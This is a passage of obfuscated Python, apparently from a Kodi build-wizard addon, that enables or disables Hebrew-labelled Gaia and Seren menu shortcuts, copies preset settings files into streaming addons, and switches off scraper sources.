    OO0OOO00OOO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:580
    with open (OO0OOO00OOO0OO0O0 ,'r')as O0O0OO0O00OO0OO00 :#line:581
      OO00OOO00OOOO0000 =O0O0OO0O00OO0OO00 .read ()#line:582
    OO00OOO00OOOO0000 =OO00OOO00OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:600
    with open (OO0OOO00OOO0OO0O0 ,'w')as O0O0OO0O00OO0OO00 :#line:603
      O0O0OO0O00OO0OO00 .write (OO00OOO00OOOO0000 )#line:604
    OO0OOO00OOO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:607
    with open (OO0OOO00OOO0OO0O0 ,'r')as O0O0OO0O00OO0OO00 :#line:608
      OO00OOO00OOOO0000 =O0O0OO0O00OO0OO00 .read ()#line:609
    OO00OOO00OOOO0000 =OO00OOO00OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:627
    with open (OO0OOO00OOO0OO0O0 ,'w')as O0O0OO0O00OO0OO00 :#line:630
      O0O0OO0O00OO0OO00 .write (OO00OOO00OOOO0000 )#line:631
def rdbuildinstall ():#line:634
  try :#line:635
   OO0O00O0000OOO0O0 =(ADDON .getSetting ("rdbuild"))#line:636
   if OO0O00O0000OOO0O0 =='true':#line:637
     O0OO0O0O0O000000O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:638
     OO0OOO0OOO0O0OO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:639
     copyfile (O0OO0O0O0O000000O ,OO0OOO0OOO0O0OO00 )#line:640
  except :#line:641
     pass #line:642
def rdbuildaddonoff ():#line:645
    O00O0O00OO000O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:648
    with open (O00O0O00OO000O000 ,'r')as O00O00OOOOO0OOO0O :#line:649
      O0O00OO0O0OO0OOO0 =O00O00OOOOO0OOO0O .read ()#line:650
    O0O00OO0O0OO0OOO0 =O0O00OO0O0OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:668
    with open (O00O0O00OO000O000 ,'w')as O00O00OOOOO0OOO0O :#line:671
      O00O00OOOOO0OOO0O .write (O0O00OO0O0OO0OOO0 )#line:672
    O00O0O00OO000O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:676
    with open (O00O0O00OO000O000 ,'r')as O00O00OOOOO0OOO0O :#line:677
      O0O00OO0O0OO0OOO0 =O00O00OOOOO0OOO0O .read ()#line:678
    O0O00OO0O0OO0OOO0 =O0O00OO0O0OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:696
    with open (O00O0O00OO000O000 ,'w')as O00O00OOOOO0OOO0O :#line:699
      O00O00OOOOO0OOO0O .write (O0O00OO0O0OO0OOO0 )#line:700
    O00O0O00OO000O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:704
    with open (O00O0O00OO000O000 ,'r')as O00O00OOOOO0OOO0O :#line:705
      O0O00OO0O0OO0OOO0 =O00O00OOOOO0OOO0O .read ()#line:706
    O0O00OO0O0OO0OOO0 =O0O00OO0O0OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:724
    with open (O00O0O00OO000O000 ,'w')as O00O00OOOOO0OOO0O :#line:727
      O00O00OOOOO0OOO0O .write (O0O00OO0O0OO0OOO0 )#line:728
    O00O0O00OO000O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:732
    with open (O00O0O00OO000O000 ,'r')as O00O00OOOOO0OOO0O :#line:733
      O0O00OO0O0OO0OOO0 =O00O00OOOOO0OOO0O .read ()#line:734
    O0O00OO0O0OO0OOO0 =O0O00OO0O0OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:752
    with open (O00O0O00OO000O000 ,'w')as O00O00OOOOO0OOO0O :#line:755
      O00O00OOOOO0OOO0O .write (O0O00OO0O0OO0OOO0 )#line:756
    O00O0O00OO000O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:759
    with open (O00O0O00OO000O000 ,'r')as O00O00OOOOO0OOO0O :#line:760
      O0O00OO0O0OO0OOO0 =O00O00OOOOO0OOO0O .read ()#line:761
    O0O00OO0O0OO0OOO0 =O0O00OO0O0OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:779
    with open (O00O0O00OO000O000 ,'w')as O00O00OOOOO0OOO0O :#line:782
      O00O00OOOOO0OOO0O .write (O0O00OO0O0OO0OOO0 )#line:783
    O00O0O00OO000O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:785
    with open (O00O0O00OO000O000 ,'r')as O00O00OOOOO0OOO0O :#line:786
      O0O00OO0O0OO0OOO0 =O00O00OOOOO0OOO0O .read ()#line:787
    O0O00OO0O0OO0OOO0 =O0O00OO0O0OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:805
    with open (O00O0O00OO000O000 ,'w')as O00O00OOOOO0OOO0O :#line:808
      O00O00OOOOO0OOO0O .write (O0O00OO0O0OO0OOO0 )#line:809
    O00O0O00OO000O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:811
    with open (O00O0O00OO000O000 ,'r')as O00O00OOOOO0OOO0O :#line:812
      O0O00OO0O0OO0OOO0 =O00O00OOOOO0OOO0O .read ()#line:813
    O0O00OO0O0OO0OOO0 =O0O00OO0O0OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:831
    with open (O00O0O00OO000O000 ,'w')as O00O00OOOOO0OOO0O :#line:834
      O00O00OOOOO0OOO0O .write (O0O00OO0O0OO0OOO0 )#line:835
    O00O0O00OO000O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:838
    with open (O00O0O00OO000O000 ,'r')as O00O00OOOOO0OOO0O :#line:839
      O0O00OO0O0OO0OOO0 =O00O00OOOOO0OOO0O .read ()#line:840
    O0O00OO0O0OO0OOO0 =O0O00OO0O0OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:858
    with open (O00O0O00OO000O000 ,'w')as O00O00OOOOO0OOO0O :#line:861
      O00O00OOOOO0OOO0O .write (O0O00OO0O0OO0OOO0 )#line:862
def rdbuildinstalloff ():#line:865
    try :#line:866
       OOOO000OOOO0000O0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:867
       OOO000OO00O0O0000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:868
       copyfile (OOOO000OOOO0000O0 ,OOO000OO00O0O0000 )#line:870
       OOOO000OOOO0000O0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:872
       OOO000OO00O0O0000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:873
       copyfile (OOOO000OOOO0000O0 ,OOO000OO00O0O0000 )#line:875
       OOOO000OOOO0000O0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:877
       OOO000OO00O0O0000 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:878
       copyfile (OOOO000OOOO0000O0 ,OOO000OO00O0O0000 )#line:880
       OOOO000OOOO0000O0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:883
       OOO000OO00O0O0000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:884
       copyfile (OOOO000OOOO0000O0 ,OOO000OO00O0O0000 )#line:886
    except :#line:888
       pass #line:889
def rdbuildaddonON ():#line:896
    O0OO0OO0OO00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:898
    with open (O0OO0OO0OO00O0OOO ,'r')as O0OO0OOOOO0O00OO0 :#line:899
      OO00O0O00OOOOOOO0 =O0OO0OOOOO0O00OO0 .read ()#line:900
    OO00O0O00OOOOOOO0 =OO00O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:918
    with open (O0OO0OO0OO00O0OOO ,'w')as O0OO0OOOOO0O00OO0 :#line:921
      O0OO0OOOOO0O00OO0 .write (OO00O0O00OOOOOOO0 )#line:922
    O0OO0OO0OO00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:926
    with open (O0OO0OO0OO00O0OOO ,'r')as O0OO0OOOOO0O00OO0 :#line:927
      OO00O0O00OOOOOOO0 =O0OO0OOOOO0O00OO0 .read ()#line:928
    OO00O0O00OOOOOOO0 =OO00O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:946
    with open (O0OO0OO0OO00O0OOO ,'w')as O0OO0OOOOO0O00OO0 :#line:949
      O0OO0OOOOO0O00OO0 .write (OO00O0O00OOOOOOO0 )#line:950
    O0OO0OO0OO00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:954
    with open (O0OO0OO0OO00O0OOO ,'r')as O0OO0OOOOO0O00OO0 :#line:955
      OO00O0O00OOOOOOO0 =O0OO0OOOOO0O00OO0 .read ()#line:956
    OO00O0O00OOOOOOO0 =OO00O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:974
    with open (O0OO0OO0OO00O0OOO ,'w')as O0OO0OOOOO0O00OO0 :#line:977
      O0OO0OOOOO0O00OO0 .write (OO00O0O00OOOOOOO0 )#line:978
    O0OO0OO0OO00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:982
    with open (O0OO0OO0OO00O0OOO ,'r')as O0OO0OOOOO0O00OO0 :#line:983
      OO00O0O00OOOOOOO0 =O0OO0OOOOO0O00OO0 .read ()#line:984
    OO00O0O00OOOOOOO0 =OO00O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1002
    with open (O0OO0OO0OO00O0OOO ,'w')as O0OO0OOOOO0O00OO0 :#line:1005
      O0OO0OOOOO0O00OO0 .write (OO00O0O00OOOOOOO0 )#line:1006
    O0OO0OO0OO00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1009
    with open (O0OO0OO0OO00O0OOO ,'r')as O0OO0OOOOO0O00OO0 :#line:1010
      OO00O0O00OOOOOOO0 =O0OO0OOOOO0O00OO0 .read ()#line:1011
    OO00O0O00OOOOOOO0 =OO00O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1029
    with open (O0OO0OO0OO00O0OOO ,'w')as O0OO0OOOOO0O00OO0 :#line:1032
      O0OO0OOOOO0O00OO0 .write (OO00O0O00OOOOOOO0 )#line:1033
    O0OO0OO0OO00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1035
    with open (O0OO0OO0OO00O0OOO ,'r')as O0OO0OOOOO0O00OO0 :#line:1036
      OO00O0O00OOOOOOO0 =O0OO0OOOOO0O00OO0 .read ()#line:1037
    OO00O0O00OOOOOOO0 =OO00O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1055
    with open (O0OO0OO0OO00O0OOO ,'w')as O0OO0OOOOO0O00OO0 :#line:1058
      O0OO0OOOOO0O00OO0 .write (OO00O0O00OOOOOOO0 )#line:1059
    O0OO0OO0OO00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1061
    with open (O0OO0OO0OO00O0OOO ,'r')as O0OO0OOOOO0O00OO0 :#line:1062
      OO00O0O00OOOOOOO0 =O0OO0OOOOO0O00OO0 .read ()#line:1063
    OO00O0O00OOOOOOO0 =OO00O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1081
    with open (O0OO0OO0OO00O0OOO ,'w')as O0OO0OOOOO0O00OO0 :#line:1084
      O0OO0OOOOO0O00OO0 .write (OO00O0O00OOOOOOO0 )#line:1085
    O0OO0OO0OO00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1088
    with open (O0OO0OO0OO00O0OOO ,'r')as O0OO0OOOOO0O00OO0 :#line:1089
      OO00O0O00OOOOOOO0 =O0OO0OOOOO0O00OO0 .read ()#line:1090
    OO00O0O00OOOOOOO0 =OO00O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1108
    with open (O0OO0OO0OO00O0OOO ,'w')as O0OO0OOOOO0O00OO0 :#line:1111
      O0OO0OOOOO0O00OO0 .write (OO00O0O00OOOOOOO0 )#line:1112
def rdbuildinstallON ():#line:1115
    try :#line:1117
       O00O00000O00O0000 =ADDONPATH +"/resources/rd/victory.xml"#line:1118
       OOO0OOOOO00O00000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1119
       copyfile (O00O00000O00O0000 ,OOO0OOOOO00O00000 )#line:1121
       O00O00000O00O0000 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1123
       OOO0OOOOO00O00000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1124
       copyfile (O00O00000O00O0000 ,OOO0OOOOO00O00000 )#line:1126
       O00O00000O00O0000 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1128
       OOO0OOOOO00O00000 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1129
       copyfile (O00O00000O00O0000 ,OOO0OOOOO00O00000 )#line:1131
       O00O00000O00O0000 =ADDONPATH +"/resources/rd/Splash.png"#line:1134
       OOO0OOOOO00O00000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1135
       copyfile (O00O00000O00O0000 ,OOO0OOOOO00O00000 )#line:1137
    except :#line:1139
       pass #line:1140
def rdbuild ():#line:1150
	OO0000000OO0O00O0 =(ADDON .getSetting ("rdbuild"))#line:1151
	if OO0000000OO0O00O0 =='true':#line:1152
		OOO0O0OO0OO0O000O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1153
		OOO0O0OO0OO0O000O .setSetting ('all_t','0')#line:1154
		OOO0O0OO0OO0O000O .setSetting ('rd_menu_enable','false')#line:1155
		OOO0O0OO0OO0O000O .setSetting ('magnet_bay','false')#line:1156
		OOO0O0OO0OO0O000O .setSetting ('magnet_extra','false')#line:1157
		OOO0O0OO0OO0O000O .setSetting ('rd_only','false')#line:1158
		OOO0O0OO0OO0O000O .setSetting ('ftp','false')#line:1160
		OOO0O0OO0OO0O000O .setSetting ('fp','false')#line:1161
		OOO0O0OO0OO0O000O .setSetting ('filter_fp','false')#line:1162
		OOO0O0OO0OO0O000O .setSetting ('fp_size_en','false')#line:1163
		OOO0O0OO0OO0O000O .setSetting ('afdah','false')#line:1164
		OOO0O0OO0OO0O000O .setSetting ('ap2s','false')#line:1165
		OOO0O0OO0OO0O000O .setSetting ('cin','false')#line:1166
		OOO0O0OO0OO0O000O .setSetting ('clv','false')#line:1167
		OOO0O0OO0OO0O000O .setSetting ('cmv','false')#line:1168
		OOO0O0OO0OO0O000O .setSetting ('dl20','false')#line:1169
		OOO0O0OO0OO0O000O .setSetting ('esc','false')#line:1170
		OOO0O0OO0OO0O000O .setSetting ('extra','false')#line:1171
		OOO0O0OO0OO0O000O .setSetting ('film','false')#line:1172
		OOO0O0OO0OO0O000O .setSetting ('fre','false')#line:1173
		OOO0O0OO0OO0O000O .setSetting ('fxy','false')#line:1174
		OOO0O0OO0OO0O000O .setSetting ('genv','false')#line:1175
		OOO0O0OO0OO0O000O .setSetting ('getgo','false')#line:1176
		OOO0O0OO0OO0O000O .setSetting ('gold','false')#line:1177
		OOO0O0OO0OO0O000O .setSetting ('gona','false')#line:1178
		OOO0O0OO0OO0O000O .setSetting ('hdmm','false')#line:1179
		OOO0O0OO0OO0O000O .setSetting ('hdt','false')#line:1180
		OOO0O0OO0OO0O000O .setSetting ('icy','false')#line:1181
		OOO0O0OO0OO0O000O .setSetting ('ind','false')#line:1182
		OOO0O0OO0OO0O000O .setSetting ('iwi','false')#line:1183
		OOO0O0OO0OO0O000O .setSetting ('jen_free','false')#line:1184
		OOO0O0OO0OO0O000O .setSetting ('kiss','false')#line:1185
		OOO0O0OO0OO0O000O .setSetting ('lavin','false')#line:1186
		OOO0O0OO0OO0O000O .setSetting ('los','false')#line:1187
		OOO0O0OO0OO0O000O .setSetting ('m4u','false')#line:1188
		OOO0O0OO0OO0O000O .setSetting ('mesh','false')#line:1189
		OOO0O0OO0OO0O000O .setSetting ('mf','false')#line:1190
		OOO0O0OO0OO0O000O .setSetting ('mkvc','false')#line:1191
		OOO0O0OO0OO0O000O .setSetting ('mjy','false')#line:1192
		OOO0O0OO0OO0O000O .setSetting ('hdonline','false')#line:1193
		OOO0O0OO0OO0O000O .setSetting ('moviex','false')#line:1194
		OOO0O0OO0OO0O000O .setSetting ('mpr','false')#line:1195
		OOO0O0OO0OO0O000O .setSetting ('mvg','false')#line:1196
		OOO0O0OO0OO0O000O .setSetting ('mvl','false')#line:1197
		OOO0O0OO0OO0O000O .setSetting ('mvs','false')#line:1198
		OOO0O0OO0OO0O000O .setSetting ('myeg','false')#line:1199
		OOO0O0OO0OO0O000O .setSetting ('ninja','false')#line:1200
		OOO0O0OO0OO0O000O .setSetting ('odb','false')#line:1201
		OOO0O0OO0OO0O000O .setSetting ('ophd','false')#line:1202
		OOO0O0OO0OO0O000O .setSetting ('pks','false')#line:1203
